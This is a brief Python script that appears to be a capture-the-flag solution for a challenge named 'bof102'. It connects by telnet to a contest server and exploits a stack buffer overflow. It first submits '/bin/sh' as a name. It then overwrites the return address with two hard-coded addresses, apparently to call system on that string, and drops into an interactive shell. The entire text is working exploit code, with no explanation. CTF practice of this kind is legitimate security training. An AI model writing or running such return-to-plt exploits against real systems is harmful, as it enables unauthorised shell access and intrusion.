#!/usr/bin/python3


from telnetlib import Telnet

t = Telnet("bof102.sstf.site", 1337)

t.read_until(b"Name > ")
t.write(b"/bin/sh" + b"\n")


payload = b"A" * (16 + 4)
payload += b"\xe0\x83\x04\x08"
payload += b"C" * 4
payload += b"\x34\xa0\x04\x08"

t.read_until(b" > ")
t.write(payload + b"\n")

t.interact()